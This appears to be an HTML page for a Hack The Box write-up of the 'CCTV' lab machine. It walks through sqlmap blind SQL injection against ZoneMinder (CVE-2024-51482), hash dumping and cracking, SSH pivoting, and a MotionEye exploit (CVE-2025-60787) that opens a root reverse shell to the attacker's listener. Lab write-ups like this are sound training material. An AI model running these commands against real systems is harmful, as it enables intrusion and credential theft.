@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CCTV &mdash; HTB Writeup</title>
+<style>
+  :root {
+    --bg: #f7f7f9;
+    --fg: #1d1d1f;
+    --muted: #5a5a5f;
+    --card: #ffffff;
+    --border: #e2e2e6;
+    --code-bg: #f0f0f3;
+    --accent: #7c3aed;
+    --link: #5b21b6;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #121214;
+      --fg: #eaeaec;
+      --muted: #a0a0a6;
+      --card: #1b1b1e;
+      --border: #2d2d31;
+      --code-bg: #0f0f11;
+      --accent: #a78bfa;
+      --link: #c4b5fd;
+    }
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--fg);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    line-height: 1.65;
+  }
+  .wrap {
+    max-width: 760px;
+    margin: 0 auto;
+    padding: 2rem 1.25rem 4rem;
+  }
+  header.page-header {
+    display: flex;
+    align-items: center;
+    gap: 1.25rem;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 1.5rem;
+    margin-bottom: 1.5rem;
+    flex-wrap: wrap;
+  }
+  header.page-header img.machine-icon {
+    width: 96px;
+    height: 96px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+  header.page-header .meta h1 {
+    margin: 0 0 0.35rem;
+    font-size: 1.9rem;
+  }
+  header.page-header .meta .tags {
+    display: flex;
+    gap: 0.5rem;
+    flex-wrap: wrap;
+    margin-top: 0.5rem;
+  }
+  .badge {
+    display: inline-block;
+    font-size: 0.78rem;
+    padding: 0.2rem 0.6rem;
+    border-radius: 999px;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    color: var(--muted);
+  }
+  .badge.difficulty-easy { color: #2e7d32; border-color: #2e7d3255; }
+  @media (prefers-color-scheme: dark) {
+    .badge.difficulty-easy { color: #81c995; }
+  }
+  nav.toc {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 1rem 1.25rem;
+    margin-bottom: 2rem;
+  }
+  nav.toc h2 {
+    margin-top: 0;
+    font-size: 1rem;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+    color: var(--muted);
+  }
+  nav.toc ul {
+    margin: 0;
+    padding-left: 1.1rem;
+  }
+  nav.toc li { margin: 0.25rem 0; }
+  nav.toc a { color: var(--link); text-decoration: none; }
+  nav.toc a:hover { text-decoration: underline; }
+  h1, h2, h3 { line-height: 1.3; }
+  h2 {
+    margin-top: 2.5rem;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 0.3rem;
+  }
+  a { color: var(--link); }
+  p { margin: 1rem 0; }
+  code {
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    background: var(--code-bg);
+    padding: 0.15rem 0.4rem;
+    border-radius: 5px;
+    font-size: 0.9em;
+  }
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1rem;
+    overflow-x: auto;
+  }
+  pre code {
+    background: none;
+    padding: 0;
+    font-size: 0.88rem;
+  }
+  img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 8px;
+    border: 1px solid var(--border);
+    display: block;
+    margin: 1.25rem 0;
+  }
+  figure {
+    margin: 1.5rem 0;
+  }
+  figcaption {
+    font-size: 0.85rem;
+    color: var(--muted);
+    text-align: center;
+    margin-top: 0.4rem;
+  }
+  blockquote.callout {
+    border-left: 4px solid var(--accent);
+    background: var(--card);
+    border-radius: 0 8px 8px 0;
+    padding: 0.75rem 1rem;
+    margin: 1.25rem 0;
+  }
+  blockquote.callout .callout-title {
+    font-weight: 600;
+    margin-bottom: 0.3rem;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.25rem 0;
+  }
+  th, td {
+    border: 1px solid var(--border);
+    padding: 0.5rem 0.75rem;
+    text-align: left;
+  }
+  th { background: var(--code-bg); }
+  footer {
+    margin-top: 3rem;
+    padding-top: 1rem;
+    border-top: 1px solid var(--border);
+    color: var(--muted);
+    font-size: 0.85rem;
+  }
+
+  :root { --user: #2563eb; --pass: #dc2626; }
+  @media (prefers-color-scheme: dark) {
+    :root { --user: #60a5fa; --pass: #f87171; }
+  }
+  /* Inline commands, paths and filenames: terminal look */
+  code {
+    display: inline;
+    background: #0b0f0b;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 5px;
+    padding: 0.1rem 0.4rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88em;
+    word-break: break-word;
+  }
+  /* Commands and replies: terminal box with a Copy button */
+  .terminal-box {
+    background: #000;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 8px;
+    padding: 0.9rem 1rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88rem;
+    white-space: pre-wrap;
+    word-break: break-all;
+    overflow-wrap: break-word;
+  }
+  .terminal-wrapper { margin: 1.25rem 0; }
+  .terminal-header { display: flex; justify-content: flex-end; padding-bottom: 6px; }
+  .copy-btn {
+    font-size: 11px;
+    padding: 4px 10px;
+    border-radius: 4px;
+    cursor: pointer;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    color: var(--link);
+  }
+  .copy-btn:hover { background: var(--accent); color: var(--bg); }
+  /* Credentials and flags: labelled boxes */
+  fieldset.cred-box, fieldset.flag-box {
+    border: 1px solid var(--border);
+    border-left: 4px solid var(--accent);
+    border-radius: 8px;
+    padding: 0.6rem 1rem 0.9rem;
+    margin: 1.25rem 0;
+    background: var(--card);
+  }
+  fieldset legend {
+    padding: 0 0.4rem;
+    font-size: 0.8rem;
+    font-weight: 600;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    color: var(--accent);
+  }
+  fieldset.flag-box {
+    background: #000;
+    border-color: #1f2a1f;
+    border-left: 4px solid #39ff14;
+    color: #39ff14;
+  }
+  fieldset.flag-box legend { color: #39ff14; }
+  fieldset.flag-box code { background: none; border: none; padding: 0; color: inherit; }
+  /* Usernames and passwords */
+  .user { color: var(--user); font-weight: 600; }
+  .pass { color: var(--pass); font-weight: 600; }
+  code .user { color: #60a5fa; }
+  code .pass { color: #f87171; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="page-header">
+  <img class="machine-icon" src="/pngs/HTB/Easy/CCTV/a1204fb6-47f1-4555-8cb3-cd3e2f60f587.png" alt="CCTV machine icon from Hack The Box" loading="lazy">
+  <div class="meta">
+    <h1>CCTV</h1>
+    <div class="tags">
+      <span class="badge">Hack The Box</span>
+      <span class="badge">Linux</span>
+      <span class="badge difficulty-easy">Easy</span>
+      <span class="badge">ZoneMinder</span>
+      <span class="badge">MotionEye</span>
+      <span class="badge">CVE-2024-51482</span>
+      <span class="badge">CVE-2025-60787</span>
+    </div>
+  </div>
+</header>
+
+<nav class="toc">
+  <h2>Contents</h2>
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#user">User Access</a></li>
+    <li><a href="#privesc">Privilege Escalation</a></li>
+  </ul>
+</nav>
+
+<blockquote class="callout">
+  <div class="callout-title">Key takeaways</div>
+  <ul>
+    <li><strong>ZoneMinder 1.37.64 login page</strong> &rarr; <strong>Blind SQL injection (CVE-2024-51482) to dump user password hashes</strong></li>
+    <li><strong>SSH as a low-privilege user</strong> &rarr; <strong>found MotionEye admin credentials in a local config file</strong></li>
+    <li><strong>MotionEye on localhost:8765</strong> &rarr; <strong>reached it by SSH port forwarding, then used an authenticated RCE (CVE-2025-60787) for a root reverse shell</strong></li>
+  </ul>
+</blockquote>
+
+<h2 id="enumeration">Enumeration</h2>
+<p>I started by enumerating the target.</p>
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.7.42</div>
+</div>
+
+<p>I found these open ports:</p>
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">22/tcp    open  ssh     syn-ack ttl 63
+80/tcp    open  http    syn-ack ttl 63</div>
+</div>
+
+<p>I added <code>cctv.htb</code> to my <code>/etc/hosts</code> file, pointed at the target IP.</p>
+
+<p>I opened the site in a browser and found a <code>staff login</code> page in the top right corner. I tried default credentials and logged in.</p>
+<fieldset class="cred-box">
+  <legend>Credentials</legend>
+  <code><span class="user">admin</span> : <span class="pass">admin</span></code>
+</fieldset>
+
+<p>I found that <code>ZoneMinder 1.37.64</code> was running, and it was vulnerable to a <code>Boolean-based SQL Injection</code>.</p>
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3</div>
+</div>
+
+<h2 id="foothold">Foothold</h2>
+<p>I found the value of the cookie by pressing <code>CTRL+Shift+C</code> while I was logged in as <span class="user">admin</span>.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/CCTV/Pasted image 20261026141124.png" alt="ZMSESSID cookie value shown in the browser's devtools" loading="lazy">
+  <figcaption>ZMSESSID cookie value shown in the browser's devtools</figcaption>
+</figure>
+
+<p>I used <code>sqlmap</code> to find a user's password hash and then cracked it. The first command found the database and its tables.</p>
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">python3 sqlmap.py -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID={Valie_Of_Cookie}" --batch --dbms=MySQL -p tid --technique=T --time-sec=5 --dump</div>
+</div>
+
+<p>The second command is the one that gives the proper credentials to crack.</p>
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">python3 sqlmap.py -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID={Value_Of_Cookie}" -p tid --dbms=mysql --level=5 --risk=3 --batch -D zm -T Users --dump --threads 3</div>
+</div>
+
+<p>Because <code>sqlmap</code> takes minutes to expose the credentials, I found this payload in <a href="https://0xdf.gitlab.io/">0xdf</a>'s write-up.</p>
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">python3 sqlmap.py -r /tmp/CCTV/removetag.request -p tid --batch --prefix="1 UNION SELECT 1,2,3,4 WHERE " --code 200 --technique=B --dbs</div>
+</div>
+
+<p>That gets the database, and then this payload gets the credentials.</p>
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">python3 sqlmap.py -r /tmp/CCTV/removetag.request -p tid --batch --prefix="1 UNION SELECT 1,2,3,4 WHERE " --code 200 --technique=B -D zm -T Users --predict-output -C Username,Password,Name,Email --dump</div>
+</div>
+
+<p>The <code>removetag.request</code> file holds the HTTP request I copied from Burp.</p>
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">cat /tmp/CCTV/removetag.request
+
+GET /zm/index.php?view=request&request=event&action=removetag&tid=1 HTTP/1.1
+Host: cctv.htb
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
+Cookie: AddMonitorsTable.bs.table.searchText=; AddMonitorsTable.bs.table.pageNumber=1; zmSkin=classic; zmCSS=base; ZMSESSID=r07np10lqok3s9trs19a0lgimc; addMonitorsprobe_Manufacturer=; addMonitorsip=; addMonitorsprobe_username=; addMonitorsprobe_password=</div>
+</div>
+
+<p>I also found this <a href="https://github.com/BridgerAlderson/CVE-2024-51482/blob/main/README.md">script</a>, which is also fast.</p>
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">python3 new.py -i cctv.htb -u admin -p admin --users</div>
+</div>
+
+<p>I got some credentials and then I cracked them with <code>hashcat</code>.</p>
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">superadmin:$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
+mark:$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
+admin:$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m</div>
+</div>
+
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">hashcat credentials.hashes -m 3200 ~/Downloads/SecLists/Passwords/Leaked-Databases/rockyou.txt --user</div>
+</div>
+
+<p>I tried password spraying and found the correct credentials to connect via SSH.</p>
+<fieldset class="cred-box">
+  <legend>Credentials</legend>
+  <code><span class="user">mark</span> : <span class="pass">opensesame</span></code>
+</fieldset>
+
+<h2 id="user">User Access</h2>
+<p>I then used SSH to connect as <span class="user">mark</span>.</p>
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">ssh mark@cctv.htb</div>
+</div>
+
+<p>After some research, I found a <code>.conf</code> file.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/CCTV/Pasted image 20260312122827.png" alt="motioneye configuration file showing admin credentials" loading="lazy">
+  <figcaption>motioneye configuration file showing admin credentials</figcaption>
+</figure>
+
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">mark@cctv:~$ cat /etc/motioneye/motion.conf
+# @admin_username admin
+# @normal_username user
+# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0</div>
+</div>
+
+<p>I found that <code>motioneye</code> typically runs its web administration interface on port 8765 by default. So I ran these commands to check it.</p>
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">netstat -l
+
+or
+
+ss -tulpn</div>
+</div>
+
+<p>I found these ports open:</p>
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">tcp        0      0 localhost:7999          0.0.0.0:*               LISTEN
+tcp        0      0 localhost:1935          0.0.0.0:*               LISTEN
+tcp        0      0 localhost:8554          0.0.0.0:*               LISTEN
+tcp        0      0 localhost:33060         0.0.0.0:*               LISTEN
+tcp        0      0 localhost:8765          0.0.0.0:*               LISTEN
+tcp        0      0 localhost:8888          0.0.0.0:*               LISTEN
+tcp        0      0 localhost:9081</div>
+</div>
+
+<p>So I set up port forwarding and then connected to the web interface.</p>
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">ssh -L 8765:localhost:8765 mark@cctv.htb</div>
+</div>
+
+<figure>
+  <img src="/pngs/HTB/Easy/CCTV/Pasted image 20260312150759.png" alt="MotionEye web login page reached through the forwarded port" loading="lazy">
+  <figcaption>MotionEye web login page reached through the forwarded port</figcaption>
+</figure>
+
+<p>I used the credentials from the <code>.conf</code> file and logged in.</p>
+<fieldset class="cred-box">
+  <legend>Credentials</legend>
+  <code><span class="user">admin</span> : <span class="pass">989c5a8ee87a0e9521ec81a79187d162109282f0</span></code>
+</fieldset>
+
+<h2 id="privesc">Privilege Escalation</h2>
+<p>After a little more searching, I found a Python script, <a href="https://github.com/gunzf0x/CVE-2025-60787/tree/main">CVE-2025-60787</a>, to get a reverse shell.</p>
+
+<p>I opened a listener on my machine with <code>nc -lvnp 9001</code> and then ran the exploit from <span class="user">mark</span>'s session.</p>
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">python3 poc.py revshell --url 'http://localhost:8765' --user 'admin' --password '989c5a8ee87a0e9521ec81a79187d162109282f0' -i My_IP --port 9001</div>
+</div>
+
+<p>This gave me a reverse shell as root.</p>
+
+<fieldset class="flag-box">
+  <legend>User Flag</legend>
+  <code>[REDACTED]</code>
+</fieldset>
+
+<fieldset class="flag-box">
+  <legend>Root Flag</legend>
+  <code>[REDACTED]</code>
+</fieldset>
+
+</div>
+<script src="/copy.js"></script>
+<script src="/nav.js"></script>
+</body>
+</html>
